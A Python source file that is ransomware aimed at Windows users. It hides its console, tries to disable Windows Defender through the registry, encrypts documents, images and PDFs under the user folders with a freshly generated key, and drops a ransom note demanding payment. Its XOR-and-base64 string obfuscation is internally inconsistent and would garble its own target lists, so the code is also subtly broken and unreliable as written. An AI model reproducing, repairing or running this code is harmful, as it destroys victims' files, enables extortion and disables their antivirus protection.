import os
import sys
import random
import string
import base64
import marshal
from cryptography.fernet import Fernet
import ctypes
import winreg
from pathlib import Path

# Obfuscated strings
def o(s): return ''.join(chr(ord(c) ^ 0xAA) for c in base64.b64decode(s).decode())
TARGET_EXTS = [o('Zm9sZGVy'), o('ZmlsZQ=='), o('dHh0'), o('anBn'), o('cG5n'), o('ZG9j'), o('eGxz'), o('cGRm')]  # doc, xls, etc. XORed
RANSOM_NOTE = o('UEFZIFRISVMgTk9XIQ==')  # PAY THIS NOW! XORed
KEY_FILE = o('a2V5LmtleQ==')  # key.key

def get_key():
    return Fernet.generate_key()

def encrypt_file(filepath, key):
    fernet = Fernet(key)
    with open(filepath, 'rb') as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(filepath, 'wb') as f:
        f.write(encrypted)

def find_files(root):
    files = []
    for ext in TARGET_EXTS:
        for file in Path(root).rglob(f'*.{ext}'):
            files.append(str(file))
    return files

def disable_av():
    # Disable Windows Defender real-time protection via registry (requires admin)
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def drop_note(path):
    with open(os.path.join(path, 'README.txt'), 'w') as f:
        f.write(RANSOM_NOTE)

def main():
    disable_av()
    
    # Target common dirs
    targets = [o('Q1Q6XFVzZXJz'), o('QzpcVXNlcnNcRG9jdW1lbnRz'), o('QzpcVXNlcnNcRGVza3RvcA==')]  # C:\Users, etc. XORed
    
    key = get_key()
    key_path = os.path.join(targets[0], KEY_FILE)
    
    with open(key_path, 'wb') as f:
        f.write(key)
    
    for target in targets:
        if os.path.exists(target):
            files = find_files(target)
            for file in files:
                try:
                    encrypt_file(file, key)
                except:
                    pass
            drop_note(target)

if __name__ == '__main__':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()